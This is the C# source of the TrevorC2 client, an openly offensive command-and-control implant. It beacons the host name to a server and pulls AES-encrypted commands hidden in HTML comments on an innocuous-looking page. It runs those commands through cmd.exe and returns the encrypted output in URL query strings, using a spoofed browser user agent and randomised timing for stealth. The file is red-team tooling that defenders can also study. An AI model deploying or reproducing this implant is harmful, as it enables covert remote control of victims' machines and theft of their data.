using System;
using System.Linq;

namespace TrevorC2Client
{
    class TrevorC2Client
    {
        /*
            TrevorC2 - legitimate looking command and control 
            Written by: Dave Kennedy @HackingDave
            Website: https://www.trustedsec.com
            GIT: https://github.com/trustedsec
            C# Client written by Franci Sacer (@francisacer1)

            This is the client connection, and only an example. Refer to the readme 
            to build your own client connection to the server C2 infrastructure.
        */

        // CONFIG CONSTANTS:
        
        const string SITE_URL = "http://127.0.0.1";
        const string ROOT_PATH_QUERY = "/";
        // THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
        const string SITE_PATH_QUERY = "/images";
        // THIS IS THE QUERY STRING PARAMETER USED
        const string QUERY_STRING = "guid=";
        // STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
        const string STUB = "oldcss=";
        // time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
        const int time_interval1 = 2;
        const int time_interval2 = 8;
        const int time_factor = 1000; // seconds
        // THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
        const string CIPHER = "Tr3v0rC2R0x@nd1s@w350m3#TrevorForget";
        
        // DO NOT CHANGE BELOW THIS LINE

        static Random rng = new Random();

        static System.Security.Cryptography.AesManaged CreateAesManagedObject(byte[] key = null, byte[] IV = null)
        {
            var aesManaged = new System.Security.Cryptography.AesManaged
            {
                Mode = System.Security.Cryptography.CipherMode.CBC,
                Padding = System.Security.Cryptography.PaddingMode.PKCS7,
                BlockSize = 128,
                KeySize = 256
            };
            if (IV != null)
            {
                aesManaged.IV = IV;
            }
            if (key != null)
            {
                aesManaged.Key = key;
            }
            return aesManaged;
        }

        static string CreateAesKey()
        {
            var aesManaged = CreateAesManagedObject();
            var hasher = new System.Security.Cryptography.SHA256Managed();
            var toHash = System.Text.Encoding.UTF8.GetBytes(CIPHER);
            var hashBytes = hasher.ComputeHash(toHash);
            var final = Convert.ToBase64String(hashBytes);
            return final;
        }

        static string EncryptString(byte[] key, string unencryptedString)
        {
            var bytes = System.Text.Encoding.UTF8.GetBytes(unencryptedString);
            var aesManaged = CreateAesManagedObject(key);
            var encryptor = aesManaged.CreateEncryptor();
            var encryptedData = encryptor.TransformFinalBlock(bytes, 0, bytes.Length);
            var fullData = aesManaged.IV.Concat(encryptedData).ToArray();
            return Convert.ToBase64String(fullData);
        }

        static string DecryptString(byte[] key, string encryptedStringWithIV)
        {
            var bytes = Convert.FromBase64String(encryptedStringWithIV);
            byte[] IV = bytes.Take(16).ToArray();
            var aesManaged = CreateAesManagedObject(key, IV);
            var decryptor = aesManaged.CreateDecryptor();
            var unencryptedData = decryptor.TransformFinalBlock(bytes, 16, bytes.Length - 16);
            return System.Text.Encoding.UTF8.GetString(unencryptedData).Trim((char)0);
        }

        static int RandomInterval()
        {
            return rng.Next(time_interval1, time_interval2 + 1);
        }

        static void Main(string[] args)
        {
            var computerName = Environment.MachineName;
            while (true)
            {
                var time = RandomInterval();

                try
                {
                    var HOSTNAME = $"magic_hostname={computerName}";
                    var key = CreateAesKey();
                    var SEND = EncryptString(Convert.FromBase64String(key), HOSTNAME);
                    var s = System.Text.Encoding.UTF8.GetBytes(SEND);
                    SEND = Convert.ToBase64String(s);
                    
                    var r = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + SEND);
                    r.Method = "GET";
                    r.KeepAlive = false;
                    r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                    r.Headers.Add("Accept-Encoding", "identity");
                    var resp = r.GetResponse();
                    break;
                }
                catch (Exception)
                {
                    Console.WriteLine($"[*] Cannot connect to {SITE_URL}");
                    Console.WriteLine($"[*] Trying again in {time} seconds...");
                    System.Threading.Thread.Sleep(time * time_factor);
                    continue;
                }
            }

            while (true)
            {
                var time = RandomInterval();

                try
                {
                    var r = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(SITE_URL + ROOT_PATH_QUERY);
                    r.Method = "GET";
                    r.KeepAlive = false;
                    r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                    r.Headers.Add("Accept-Encoding", "identity");
                    var resp = r.GetResponse();
                    var reqstream = resp.GetResponseStream();
                    var sr = new System.IO.StreamReader(reqstream);
                    string res = sr.ReadToEnd();
                    var ENCRYPTEDSTREAM = res.Split('\n').Where(x => x.Contains($"<!-- {STUB}")).FirstOrDefault();
                    var ENCRYPTED = ENCRYPTEDSTREAM.Split(new string[] { $"<!-- {STUB}" }, StringSplitOptions.None);
                    ENCRYPTED = ENCRYPTED[1].Split(new string[] { " --></body>" }, StringSplitOptions.None);
                    var key = CreateAesKey();
                    var DECRYPTED = DecryptString(Convert.FromBase64String(key), ENCRYPTED[0]);
                    if (DECRYPTED == "nothing")
                    {
                        System.Threading.Thread.Sleep(time * time_factor);
                    }
                    else
                    {
                        if (DECRYPTED.StartsWith(computerName)){
                            DECRYPTED = DECRYPTED.Split(new string[] { computerName + "::::" }, StringSplitOptions.None)[1];

                            var compiler = new System.Diagnostics.Process();
                            compiler.StartInfo.FileName = "cmd.exe";
                            compiler.StartInfo.Arguments = $"/Q /c {DECRYPTED} 2>&1";
                            compiler.StartInfo.UseShellExecute = false;
                            compiler.StartInfo.RedirectStandardOutput = true;
                            compiler.Start();
                            var RUN = compiler.StandardOutput.ReadToEnd();
                            compiler.WaitForExit();

                            RUN = (computerName + "::::" + RUN);
                            var SEND = EncryptString(Convert.FromBase64String(key), RUN);
                            var s = System.Text.Encoding.UTF8.GetBytes(SEND);
                            SEND = Convert.ToBase64String(s);
                            r = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + SEND);
                            r.Method = "GET";
                            r.KeepAlive = false;
                            r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                            r.Headers.Add("Accept-Encoding", "identity");
                            resp = r.GetResponse();
                            System.Threading.Thread.Sleep(time * time_factor);
                        }
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine($"[*] Cannot connect to {SITE_URL}");
                    Console.WriteLine($"[*] Trying again in {time} seconds...");
                    System.Threading.Thread.Sleep(time * time_factor);
                    continue;
                }
            }
        }
    }
}
